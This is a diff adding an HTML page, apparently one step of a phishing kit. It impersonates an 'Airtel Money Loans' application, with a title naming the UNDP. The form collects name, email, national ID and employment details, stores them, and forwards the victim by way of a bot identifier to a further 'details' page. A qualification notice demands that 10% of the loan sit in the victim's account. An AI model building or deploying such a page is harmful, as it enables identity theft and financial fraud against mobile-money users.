@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Formulaire de demande UNDP</title>
+
+<style>
+body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+.loan-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+h2 { text-align: center; margin-bottom: 20px; }
+label { display: block; margin: 10px 0 5px; font-weight: bold; }
+input, select { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #ccc; margin-bottom: 15px; }
+button { width: 100%; padding: 12px; background: darkblue; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
+.logo-container { width: 100%;
+      height: 120px;
+       margin-bottom: 20px;
+       background-color: darkblue;
+       color: white;
+       text-align: center;
+      padding-top: 20px; }
+.logo { width: 100%; height: 100%;
+    background-color: blue;
+    color: white;
+     object-fit: cover; }
+.loan-notice { background: #fff3cd;
+   border: 1px solid #ffeeba; 
+   padding: 12px;
+    border-radius: 6px; 
+    font-size: 14px;
+    margin-bottom: 20px;
+ }
+.loan-notice ol {
+    padding-left: 20px;
+    margin: 8px 0 0 0;
+}
+.loan-notice li {
+    margin-bottom: 6px;
+}
+</style>
+</head>
+<body>
+
+<div class="loan-container">
+    <div class="logo-container">
+     <h1>Airtel Money Loans</h1>   
+    </div>
+
+    <form id="loanForm">
+
+        <label>Nom complet</label>
+        <input id="fullName" type="text" required placeholder="Entrez votre nom complet">
+
+        <label>Montant du prêt (USD)</label>
+        <input id="loanAmount" type="number" required placeholder="MIN50">
+
+        <label>Email</label>
+        <input id="email" type="email" placeholder="exemple@gmail.com" required>
+
+        <label>Carte nationale d'identité</label>
+        <input id="nationalId" type="text" placeholder="Carte nationale d'identité">
+
+        <label>Statut professionnel</label>
+        <select id="employmentStatus" required>
+            <option value="">Sélectionner</option>
+            <option value="employed">Employé</option>
+            <option value="self-employed">Travailleur indépendant</option>
+            <option value="unemployed">Sans emploi</option>
+            <option value="student">Étudiant</option>
+        </select>
+
+        <label>Objet du prêt</label>
+        <select id="loanPurpose" required>
+            <option value="">Sélectionner</option>
+            <option value="business">Entreprise</option>
+            <option value="personal">Prêt personnel</option>
+            <option value="schoolfees">Frais scolaires</option>
+            <option value="medical">Médical</option>
+            <option value="others">Autres</option>
+        </select>
+
+        <div class="loan-notice">
+            <strong>Avis de qualification :</strong>
+            <ol>
+                 <li>Doit postuler avec un compte Airtel actif.</li>
+                <li>Doit avoir au moins 10 % du montant demandé sur le compte Airtel.</li>
+            </ol>
+        </div>
+
+        <button type="submit">Suivant</button>
+
+    </form>
+</div>
+
+<script>
+// ✅ BOT ID FIX
+let botId = new URLSearchParams(window.location.search).get('botId');
+if (!botId) {
+    const parts = window.location.pathname.split('/');
+    const botIndex = parts.indexOf('bot');
+    if (botIndex !== -1 && parts[botIndex + 1]) botId = parts[botIndex + 1];
+}
+if (!botId) { alert("Lien d'accès invalide"); throw new Error("botId missing"); }
+localStorage.setItem('botId', botId);
+
+// ---------------- FORM LOGIC ----------------
+document.getElementById('loanForm').addEventListener('submit', e => {
+    e.preventDefault();
+
+    localStorage.setItem('fullName', fullName.value);
+    localStorage.setItem('loanAmount', loanAmount.value);
+    localStorage.setItem('email', email.value);
+    localStorage.setItem('nationalId', nationalId.value);
+    localStorage.setItem('employmentStatus', employmentStatus.value);
+    localStorage.setItem('loanPurpose', loanPurpose.value);
+
+    window.location.href = `details.html?botId=${botId}`;
+});
+</script>
+
+</body>
+</html>
